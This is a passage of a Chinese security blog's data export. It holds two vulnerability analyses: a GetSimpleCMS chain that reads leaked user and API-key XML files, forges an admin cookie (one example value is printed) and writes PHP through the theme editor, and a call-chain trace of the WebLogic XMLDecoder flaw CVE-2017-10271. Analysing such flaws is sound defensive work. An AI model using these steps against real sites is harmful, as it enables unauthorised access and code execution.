src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/33fb548acfc58b7ac5717900e039b927.png\"></p>\n<p>可以看到，这里将位于conf/extra/httpd-vhosts.conf文件导入</p>\n<p>跟进 httpd-vhosts.conf文件</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/d5dc1155047ddd9cfd276ee555973bbf.png\"></p>\n<p>可以看到，在这里，默认情况下 AllowOverride 默认值是All</p>\n<p>当AllowOverride指令设置为 All时，所有具有”.htaccess”作用域的指令都允许出现在.htaccess文件中。</p>\n<p>此时，目录中的.htaccess配置文件为启用状态</p>\n<p>例如位于getsimplecms/data目录中的.htaccess配置文件</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/8710c3b580348616abb6b1c5f29926be.png\"></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/4ff4202d805ac20f20a4ab3f3c4cee13.png\"></p>\n<p>&nbsp;</p>\n<p>当此.htaccess配置文件被加载时，是禁止该目录被web端访问的</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/425cc108ea9cafb4e56ff37e536667b9.png\"></p>\n<p>也就是说，通过该方法，通过web端访问data目录时，不会显示其中文件列表</p>\n<p>与其中文件内容，是可以很好的保护存在于该目录下的文件，不被泄露</p>\n<p>但是在笔者的ubuntu服务器，ubuntu apache2.conf中</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/92371b4bbd1d1215aed845ef903abf85.png\"></p>\n<p>AllowOverride 默认值是None，默认的情况下，不加载目录中的.htaccess</p>\n<p>我们将上述的.htaccess文件放入ubuntu服务器的web目录中</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/1caa4a8eedb5684f9319d60b63a6aad9.png\"></p>\n<p>再通过浏览器访问这个路径</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/9474c387505faf554297a061b63d9922.png\"></p>\n<p>如上图可见，.htaccess并没有生效，而路径中的文件，是可以被泄露的</p>\n<p>回归到本次漏洞：</p>\n<p>访问<a href=\"http://127.0.0.1/getsimplecms/data/users/admin.xml\">http://127.0.0.1/getsimplecms/data/users/admin.xml</a></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/f51ce9b10a60cc6bfef5dcbe4b4429a2.png\"></p>\n<p>在.htaccess没有生效的情况下，我们获取admin.xml中记录的用户相关信息，该cms并没有将用户信息写入数据库，而是全部存于该文件中</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/d7e8b50b48d916e31bdc0f34eb294c00.png\"></p>\n<p>访问<a href=\"http://127.0.0.1/getsimplecms/data/other/authorization.xml%E8%8E%B7%E5%8F%96authorization.xml%E4%B8%AD%E8%AE%B0%E5%BD%95%E7%9A%84apikey\">http://127.0.0.1/getsimplecms/data/other/authorization.xml获取authorization.xml中记录的apikey</a></p>\n<p>现在我们得到如下的信息：（用户名/加密后的密码/apikey）</p>\n<p>该cms并没有将用户信息写入数据库，而是全部存于xml文件中</p>\n<p>通过获取的信息，接下来进一步分析如何利用这些泄露的信息：</p>\n<p>&nbsp;</p>\n<p><strong>Cookie**</strong>算法分析：**</p>\n<p>分析下GetSimple中的cookie是如何生成的</p>\n<p>位于\\GetSimpleCMS\\admin\\inc\\cookie_functions.php</p>\n<p>create_cookie方法</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/71cf338a24e2f5d299a6a0bf17eee8d7.png\"></p>\n<p>计算cookie所需的$USR $SALT 对应如下：</p>\n<p>GetSimpleCMS\\data\\users\\admin.xml文件</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/5ebdf7efe2978f33be5c8646453aec5d.png\"></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/0bc28463ea9803bf8d66b973af0d8924.png\"></p>\n<p>&nbsp;</p>\n<p>getsimplecms\\data\\other\\authorization.xml</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/eaaa1f73a863f9c35b522abc831022ce.png\"></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/2b25c623398bdd646967fb4a5900bc18.png\"></p>\n<p>这些信息是可以直接读取出来的</p>\n<p>getsimplecms 中Cookie的算法的实现如下:</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/9c47e0ca312ccbf96e9ba83e85e62e69.png\"></p>\n<p>&nbsp;</p>\n<p>算法相对简单，通过$SALT值与$USR进行拼接；$SALT值与$cookie_name拼接，最终通过sha1进行加密，算出对应的cookie键值对</p>\n<p>通过泄露的文件与cookie算法，可以顺利计算出对应用户的cookie</p>\n<p>现在，可以伪造任意成员的cookie了</p>\n<p>以USR :admin举例说明：</p>\n<p>最终拼接的cookie为：</p>\n<p>GS_ADMIN_USERNAME=admin;48fd5258d478eec2a8f417f358c767c992f01b51=8ce411833fcfaedf4fcf5390132a153c00e0482c</p>\n<p>&nbsp;</p>\n<p><strong>Password**</strong>算法分析：**</p>\n<p>分析下Password的计算方式</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/b911761b7f4485b3b7cc4725e94eab5d.png\"></p>\n<p>Password的加密，是通过passhash()方法来实现的</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/13b52623a2c40de2dee14718f491e452.png\"></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/bd93cf9866b092b8d92ebd6a96c0f300.png\"></p>\n<p>GSLOGINSALT是用来保护的密码的额外的salt值，默认情况为空。</p>\n<p>所以这里的密码计算就比较直接了，通过sha1方法对明文密码进行加密</p>\n<pre><code>sha1($p)</code></pre>\n<p>通过sha1 hash将明文密码加密为密文。</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/8db21433099383b6a47fbb7387b4670d.png\"></p>\n<p>也就是说，只要获取了加密后的password，有一定几率，可以破解为明文：</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/a8fb07b8a4942c681657da675eec1963.png\"></p>\n<p>获取到管理员cookie/password后，使用管理员账号登陆后台</p>\n<p>&nbsp;</p>\n<p>通过伪造cookie访问后台：</p>\n<p>未登录时，访问后台地址</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/47bc6febbcfdde8d02b9821606b39f2a.png\"></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/403179b2029b01b0dbb89958b7f8e268.png\"></p>\n<p>此时需要填写正确的用户名密码才可以登陆后台</p>\n<p>这里，通过改包的方式，将cookie修改为之前计算出的值</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/2cfff8d9aae7746778eb8d537c5d4523.png\"></p>\n<p>此时，无需登陆，直接进入后台</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/88958e1d119a606e6815cc2d36a53873.png\"></p>\n<p>访问如下url</p>\n<p><a href=\"http://127.0.0.1/getsimplecms/admin/theme-edit.php\">http://127.0.0.1/getsimplecms/admin/theme-edit.php</a></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/7d35092eae92dd89eb370ba1accef8ca.png\"></p>\n<p>在这里可以对模板文件进行编辑，在这里可以写入任意php代码，造成远程代码执行漏洞</p>\n<p>例如：</p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/71f77773b77a70dc7d03abe48fa61e34.png\"></p>\n<p>访问如下地址：</p>\n<p><a href=\"http://127.0.0.1/getsimplecms/theme/Innovation/template.php\">http://127.0.0.1/getsimplecms/theme/Innovation/template.php</a></p>\n<p><img src=\"http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/06/81e5e768a8b9eff4fa68326fa2e8dcb3.png\"></p>\n<p>&nbsp;</p>\n<p>插入的php代码被成功执行</p>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>&nbsp;</p>\n<h1 id=\"0x05-修复建议\"><a href=\"#0x05-修复建议\" class=\"headerlink\" title=\"0x05  修复建议\"></a><strong>0x05</strong>  <strong>修复建议</strong></h1><hr>\n<p>目前官方没有进行修复，使用此cms的用户，需要确保apache配置文件中，AllowOverride值为All</p>"},{"title":"Weblogic XMLDecoder RCE分析(CVE-2017-10271)","date":"2019-10-12T07:50:49.000Z","cover":"https://s2.ax1x.com/2020/01/02/ltCxmt.md.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nOracle WebLogic Server是Oracle Corporation开发的一款Java EE 应用服务器，其支持EJB、JSP、JMS、XML等多种语言且具有可扩展性、快速开发等多种特性。\n\nOracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的HTTP请求即可拿到目标服务器的权限。\n\n<!--more-->\n\n漏洞分析\n--------\n\n本文中所调试的Weblogic版本为10.36\n\n在启动Weblogic前，在startWebLogic.cmd中加入如下图红框处指令\n\n![lY2s54.png](https://s2.ax1x.com/2020/01/02/lY2s54.png)\n\n这将配置Weblogic的远程调试的端口为9999\n\n首先我们回放一下poc数据包，以跟踪漏洞执行流程，注意，这里的poc并不能真正的在笔者的系统上执行，因为我是用了原版poc的payload而并未对其进行windows版本的更改。这里只是观察期执行流程所用\n\n![lYR9iQ.png](https://s2.ax1x.com/2020/01/02/lYR9iQ.png)\n\n其实上图这个数据包的url部分字符串(CoordinatorPortType)并不是固定的\n\n通过查看wls-wsat.war!\\\\WEB-INF\\\\web.xml文件可以发现\n\n可以利用的接口有如下几个\n\nCoordinatorPortType  \nRegistrationPortTypeRPC  \nParticipantPortType  \nRegistrationRequesterPortType  \nCoordinatorPortType11  \nRegistrationPortTypeRPC11  \nParticipantPortType11  \nRegistrationRequesterPortType11\n\n\n\n言归正传，回到上文的请求中来。当该请求发送后，可见weblogic返回的响应如下\n\n![lY26PJ.png](https://s2.ax1x.com/2020/01/02/lY26PJ.png)\n\n通过分析weblogic的响应信息，我们可以从中看出一些线索\n\n![lY2XsP.png](https://s2.ax1x.com/2020/01/02/lY2XsP.png)\n\n在上图\\<ns2:frame /\\>标签中我们可以看出weblogic调用函数XMLDecoder的调用栈\n\n通过\\<ns2:frame /\\>标签中的信息，我们可以整理出如下的调用链\n\nprocessRequest\\>readHeaderOld\\>receive\\>receiveRequest\\>receiveRequest\\>readEntry\\>readUTF\\>readObject\n\n![lYRSIg.png](https://s2.ax1x.com/2020/01/02/lYRSIg.png)\n\n我们发送的请求从WorkContextServerTube.java文件中的processRequest方法进入，经历了上图一系列处理之后，最终到达XMLDecoder.java文件中的readObject方法，进行XMLDecode,从而触发了漏洞\n\n首先看下processRequest方法\n\n![lY2bRA.png](https://s2.ax1x.com/2020/01/02/lY2bRA.png)\n\n在调用processRequest方法时需要传入参数var1，var1为POST请求中传进来的XML数据，var1数据见下图\n\n![lY25VO.png](https://s2.ax1x.com/2020/01/02/lY25VO.png)\n\n接着，程序将xml头部进行解析并赋值给var3，如果var3不为空，就进入readHeaderOld()方法，见下图\n\n![lY2hqK.png](https://s2.ax1x.com/2020/01/02/lY2hqK.png)\n\n跟入readHeaderOld方法\n\n![lY2DVU.png](https://s2.ax1x.com/2020/01/02/lY2DVU.png)\n\n可见readHeaderOld方法中使用如下红框中操作对缓存区数据进行处理\n\n![lY2xZ8.png](https://s2.ax1x.com/2020/01/02/lY2xZ8.png)\n\n其中var4为poc中构造的payload代码\n\n![lY22x1.png](https://s2.ax1x.com/2020/01/02/lY22x1.png)\n\n对应数据包中红框中数据\n\n![lY2OMt.png](https://s2.ax1x.com/2020/01/02/lY2OMt.png)\n\n接着用var4创建WorkContextXmlInputAdapter类的对象 var6\n\n![lY2jqf.png](https://s2.ax1x.com/2020/01/02/lY2jqf.png)\n\n我们看一下WorkContextXmlInputAdapter的实现，如下图\n\n![lYRizn.png](https://s2.ax1x.com/2020/01/02/lYRizn.png)\n\n可见在该类的构造方法中，将传递进来的XML格式的序列化数据通过XMLDecoder来进行反序列化操作，并传递给this.xmlDecoder\n\n此时var6入下图所示\n\n![lY2WKx.png](https://s2.ax1x.com/2020/01/02/lY2WKx.png)\n\nvar6将被传入receive方法进行处理\n\n跟进receive方法\n\n![lY2oIe.png](https://s2.ax1x.com/2020/01/02/lY2oIe.png)\n\n可见我们传入的payload被传入receiveRequest方法中，继续跟入receiveRequest方法\n\nreceiveRequest方法\n\n![lY20bT.png](https://s2.ax1x.com/2020/01/02/lY20bT.png)\n\n接着跟入receiveRequest方法中，见下图\n\n![lY2g2R.png](https://s2.ax1x.com/2020/01/02/lY2g2R.png)\n\n可见receiveRequest方法调用了readEntry方法对传入的payload进行处理\n\n继续跟入readEntry方法\n\n![lYRPRs.png](https://s2.ax1x.com/2020/01/02/lYRPRs.png)\n\n在readEntry方法中调用readUTF方法对payload进行处理\n\n跟入readUTF方法\n\n![lY2qxI.png](https://s2.ax1x.com/2020/01/02/lY2qxI.png)\n\nreadUTF方法中使用readObject对XMLDecoder对象进行了反序列化，从而导致了代码执行。这里的this.xmlDecoder即为我们传入的payload，见下图\n\n![lY27PH.png](https://s2.ax1x.com/2020/01/02/lY27PH.png)\n\n至此，漏洞利用的这个流程分析完毕，可见构造的xml数据从请求中一路传递到漏洞触发点，在进行反序列化时被触发。关于payload的构造以及xmldecoder反序列化的相关知识，我会在下一篇文章中着重分析。","source":"_posts/CVE-2017-10271.md","raw":"---\ntitle: Weblogic XMLDecoder RCE分析(CVE-2017-10271)\ndate: 2019-10-12 15:50:49\ntags: [web漏洞分析 ,java]\ncategories: 技术\ncover: https://s2.ax1x.com/2020/01/02/ltCxmt.md.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nOracle WebLogic Server是Oracle Corporation开发的一款Java EE 应用服务器，其支持EJB、JSP、JMS、XML等多种语言且具有可扩展性、快速开发等多种特性。\n\nOracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的HTTP请求即可拿到目标服务器的权限。\n\n<!--more-->\n\n漏洞分析\n--------\n\n本文中所调试的Weblogic版本为10.36\n\n在启动Weblogic前，在startWebLogic.cmd中加入如下图红框处指令\n\n![lY2s54.png](https://s2.ax1x.com/2020/01/02/lY2s54.png)\n\n这将配置Weblogic的远程调试的端口为9999\n\n首先我们回放一下poc数据包，以跟踪漏洞执行流程，注意，这里的poc并不能真正的在笔者的系统上执行，因为我是用了原版poc的payload而并未对其进行windows版本的更改。这里只是观察期执行流程所用\n\n![lYR9iQ.png](https://s2.ax1x.com/2020/01/02/lYR9iQ.png)\n\n其实上图这个数据包的url部分字符串(CoordinatorPortType)并不是固定的\n\n通过查看wls-wsat.war!\\\\WEB-INF\\\\web.xml文件可以发现\n\n可以利用的接口有如下几个\n\nCoordinatorPortType  \nRegistrationPortTypeRPC  \nParticipantPortType  \nRegistrationRequesterPortType  \nCoordinatorPortType11  \nRegistrationPortTypeRPC11  \nParticipantPortType11  \nRegistrationRequesterPortType11\n\n\n\n言归正传，回到上文的请求中来。当该请求发送后，可见weblogic返回的响应如下\n\n![lY26PJ.png](https://s2.ax1x.com/2020/01/02/lY26PJ.png)\n\n通过分析weblogic的响应信息，我们可以从中看出一些线索\n\n![lY2XsP.png](https://s2.ax1x.com/2020/01/02/lY2XsP.png)\n\n在上图\\<ns2:frame /\\>标签中我们可以看出weblogic调用函数XMLDecoder的调用栈\n\n通过\\<ns2:frame /\\>标签中的信息，我们可以整理出如下的调用链\n\nprocessRequest\\>readHeaderOld\\>receive\\>receiveRequest\\>receiveRequest\\>readEntry\\>readUTF\\>readObject\n\n![lYRSIg.png](https://s2.ax1x.com/2020/01/02/lYRSIg.png)\n\n我们发送的请求从WorkContextServerTube.java文件中的processRequest方法进入，经历了上图一系列处理之后，最终到达XMLDecoder.java文件中的readObject方法，进行XMLDecode,从而触发了漏洞\n\n首先看下processRequest方法\n\n![lY2bRA.png](https://s2.ax1x.com/2020/01/02/lY2bRA.png)\n\n在调用processRequest方法时需要传入参数var1，var1为POST请求中传进来的XML数据，var1数据见下图\n\n![lY25VO.png](https://s2.ax1x.com/2020/01/02/lY25VO.png)\n\n接着，程序将xml头部进行解析并赋值给var3，如果var3不为空，就进入readHeaderOld()方法，见下图\n\n![lY2hqK.png](https://s2.ax1x.com/2020/01/02/lY2hqK.png)\n\n跟入readHeaderOld方法\n\n![lY2DVU.png](https://s2.ax1x.com/2020/01/02/lY2DVU.png)\n\n可见readHeaderOld方法中使用如下红框中操作对缓存区数据进行处理\n\n![lY2xZ8.png](https://s2.ax1x.com/2020/01/02/lY2xZ8.png)\n\n其中var4为poc中构造的payload代码\n\n![lY22x1.png](https://s2.ax1x.com/2020/01/02/lY22x1.png)\n\n对应数据包中红框中数据\n\n![lY2OMt.png](https://s2.ax1x.com/2020/01/02/lY2OMt.png)\n\n接着用var4创建WorkContextXmlInputAdapter类的对象 var6\n\n![lY2jqf.png](https://s2.ax1x.com/2020/01/02/lY2jqf.png)\n\n我们看一下WorkContextXmlInputAdapter的实现，如下图\n\n![lYRizn.png](https://s2.ax1x.com/2020/01/02/lYRizn.png)\n\n可见在该类的构造方法中，将传递进来的XML格式的序列化数据通过XMLDecoder来进行反序列化操作，并传递给this.xmlDecoder\n\n此时var6入下图所示\n\n![lY2WKx.png](https://s2.ax1x.com/2020/01/02/lY2WKx.png)\n\nvar6将被传入receive方法进行处理\n\n跟进receive方法\n\n![lY2oIe.png](https://s2.ax1x.com/2020/01/02/lY2oIe.png)\n\n可见我们传入的payload被传入receiveRequest方法中，继续跟入receiveRequest方法\n\nreceiveRequest方法\n\n![lY20bT.png](https://s2.ax1x.com/2020/01/02/lY20bT.png)\n\n接着跟入receiveRequest方法中，见下图\n\n![lY2g2R.png](https://s2.ax1x.com/2020/01/02/lY2g2R.png)\n\n可见receiveRequest方法调用了readEntry方法对传入的payload进行处理\n\n继续跟入readEntry方法\n\n![lYRPRs.png](https://s2.ax1x.com/2020/01/02/lYRPRs.png)\n\n在readEntry方法中调用readUTF方法对payload进行处理\n\n跟入readUTF方法\n\n![lY2qxI.png](https://s2.ax1x.com/2020/01/02/lY2qxI.png)\n\nreadUTF方法中使用readObject对XMLDecoder对象进行了反序列化，从而导致了代码执行。这里的this.xmlDecoder即为我们传入的payload，见下图\n\n![lY27PH.png](https://s2.ax1x.com/2020/01/02/lY27PH.png)\n\n至此，漏洞利用的这个流程分析完毕，可见构造的xml数据从请求中一路传递到漏洞触发点，在进行反序列化时被触发。关于payload的构造以及xmldecoder反序列化的相关知识，我会在下一篇文章中着重分析。","slug":"CVE-2017-10271","published":1,"updated":"2020-10-27T09:25:29.099Z","_id":"ckgrozu8a000jwsa972cn6jg5","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Oracle WebLogic Server是Oracle Corporation开发的一款Java EE 应用服务器，其支持EJB、JSP、JMS、XML等多种语言且具有可扩展性、快速开发等多种特性。</p>\n<p>Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的HTTP请求即可拿到目标服务器的权限。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>本文中所调试的Weblogic版本为10.36</p>\n<p>在启动Weblogic前，在startWebLogic.cmd中加入如下图红框处指令</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2s54.png\" alt=\"lY2s54.png\"></p>\n<p>这将配置Weblogic的远程调试的端口为9999</p>\n<p>首先我们回放一下poc数据包，以跟踪漏洞执行流程，注意，这里的poc并不能真正的在笔者的系统上执行，因为我是用了原版poc的payload而并未对其进行windows版本的更改。这里只是观察期执行流程所用</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lYR9iQ.png\" alt=\"lYR9iQ.png\"></p>\n<p>其实上图这个数据包的url部分字符串(CoordinatorPortType)并不是固定的</p>\n<p>通过查看wls-wsat.war!\\WEB-INF\\web.xml文件可以发现</p>\n<p>可以利用的接口有如下几个</p>\n<p>CoordinatorPortType<br>RegistrationPortTypeRPC<br>ParticipantPortType<br>RegistrationRequesterPortType<br>CoordinatorPortType11<br>RegistrationPortTypeRPC11<br>ParticipantPortType11<br>RegistrationRequesterPortType11</p>\n<p>言归正传，回到上文的请求中来。当该请求发送后，可见weblogic返回的响应如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY26PJ.png\" alt=\"lY26PJ.png\"></p>\n<p>通过分析weblogic的响应信息，我们可以从中看出一些线索</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2XsP.png\" alt=\"lY2XsP.png\"></p>\n<p>在上图&lt;ns2:frame /&gt;标签中我们可以看出weblogic调用函数XMLDecoder的调用栈</p>\n<p>通过&lt;ns2:frame /&gt;标签中的信息，我们可以整理出如下的调用链</p>\n<p>processRequest&gt;readHeaderOld&gt;receive&gt;receiveRequest&gt;receiveRequest&gt;readEntry&gt;readUTF&gt;readObject</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lYRSIg.png\" alt=\"lYRSIg.png\"></p>\n<p>我们发送的请求从WorkContextServerTube.java文件中的processRequest方法进入，经历了上图一系列处理之后，最终到达XMLDecoder.java文件中的readObject方法，进行XMLDecode,从而触发了漏洞</p>\n<p>首先看下processRequest方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2bRA.png\" alt=\"lY2bRA.png\"></p>\n<p>在调用processRequest方法时需要传入参数var1，var1为POST请求中传进来的XML数据，var1数据见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY25VO.png\" alt=\"lY25VO.png\"></p>\n<p>接着，程序将xml头部进行解析并赋值给var3，如果var3不为空，就进入readHeaderOld()方法，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2hqK.png\" alt=\"lY2hqK.png\"></p>\n<p>跟入readHeaderOld方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2DVU.png\" alt=\"lY2DVU.png\"></p>\n<p>可见readHeaderOld方法中使用如下红框中操作对缓存区数据进行处理</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2xZ8.png\" alt=\"lY2xZ8.png\"></p>\n<p>其中var4为poc中构造的payload代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY22x1.png\" alt=\"lY22x1.png\"></p>\n<p>对应数据包中红框中数据</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2OMt.png\" alt=\"lY2OMt.png\"></p>\n<p>接着用var4创建WorkContextXmlInputAdapter类的对象 var6</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2jqf.png\" alt=\"lY2jqf.png\"></p>\n<p>我们看一下WorkContextXmlInputAdapter的实现，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lYRizn.png\" alt=\"lYRizn.png\"></p>\n<p>可见在该类的构造方法中，将传递进来的XML格式的序列化数据通过XMLDecoder来进行反序列化操作，并传递给this.xmlDecoder</p>\n<p>此时var6入下图所示</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2WKx.png\" alt=\"lY2WKx.png\"></p>\n<p>var6将被传入receive方法进行处理</p>\n<p>跟进receive方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2oIe.png\" alt=\"lY2oIe.png\"></p>\n<p>可见我们传入的payload被传入receiveRequest方法中，继续跟入receiveRequest方法</p>\n<p>receiveRequest方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY20bT.png\" alt=\"lY20bT.png\"></p>\n<p>接着跟入receiveRequest方法中，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2g2R.png\" alt=\"lY2g2R.png\"></p>\n<p>可见receiveRequest方法调用了readEntry方法对传入的payload进行处理</p>\n<p>继续跟入readEntry方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lYRPRs.png\" alt=\"lYRPRs.png\"></p>\n<p>在readEntry方法中调用readUTF方法对payload进行处理</p>\n<p>跟入readUTF方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY2qxI.png\" alt=\"lY2qxI.png\"></p>\n<p>readUTF方法中使用readObject对XMLDecoder对象进行了反序列化，从而导致了代码执行。这里的this.xmlDecoder即为我们传入的payload，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2020/01/02/lY27PH.png\" alt=\"lY27PH.png\"></p>\n<p>至此，漏洞利用的这个流程分析完毕，可见构造的xml数据从请求中一路传递到漏洞触发点，在进行反序列化时被触发。关于payload的构造以及xmldecoder反序列化的相关知识，我会在下一篇文章中着重分析。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Oracle WebLogic Server是Oracle Corporation开发的一款Java EE 应用服务器，其支持EJB、JSP、JMS、XML等多种语言且具有可扩展性、快速开发等多种特性。</p>\n<p>Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的HTTP请求即可拿到目标服务器的权限。</p>","more":"<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>本文中所调试的Weblogic版本为10.36</p>\n<p>在启动Weblogic前，在startWebLogic.cmd中加入如下图红框处指令</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2s54.png\" alt=\"lY2s54.png\"></p>\n<p>这将配置Weblogic的远程调试的端口为9999</p>\n<p>首先我们回放一下poc数据包，以跟踪漏洞执行流程，注意，这里的poc并不能真正的在笔者的系统上执行，因为我是用了原版poc的payload而并未对其进行windows版本的更改。这里只是观察期执行流程所用</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lYR9iQ.png\" alt=\"lYR9iQ.png\"></p>\n<p>其实上图这个数据包的url部分字符串(CoordinatorPortType)并不是固定的</p>\n<p>通过查看wls-wsat.war!\\WEB-INF\\web.xml文件可以发现</p>\n<p>可以利用的接口有如下几个</p>\n<p>CoordinatorPortType<br>RegistrationPortTypeRPC<br>ParticipantPortType<br>RegistrationRequesterPortType<br>CoordinatorPortType11<br>RegistrationPortTypeRPC11<br>ParticipantPortType11<br>RegistrationRequesterPortType11</p>\n<p>言归正传，回到上文的请求中来。当该请求发送后，可见weblogic返回的响应如下</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY26PJ.png\" alt=\"lY26PJ.png\"></p>\n<p>通过分析weblogic的响应信息，我们可以从中看出一些线索</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lY2XsP.png\" alt=\"lY2XsP.png\"></p>\n<p>在上图&lt;ns2:frame /&gt;标签中我们可以看出weblogic调用函数XMLDecoder的调用栈</p>\n<p>通过&lt;ns2:frame /&gt;标签中的信息，我们可以整理出如下的调用链</p>\n<p>processRequest&gt;readHeaderOld&gt;receive&gt;receiveRequest&gt;receiveRequest&gt;readEntry&gt;readUTF&gt;readObject</p>\n<p><img src=\"https://s2.ax1x.com/2020/01/02/lYRSIg.png\" alt=\"lYRSIg.png\"></p>\n<p>我们发送的请求从WorkContextServerTube.java文件中的processRequest方法进入，经历了上图一系列处理之后，最终到达XMLDecoder.java文件中的readObject方法，进行XMLDecode,从而触发了漏洞</p>\n<p>首先看下processRequest方法</p>\n<p><img 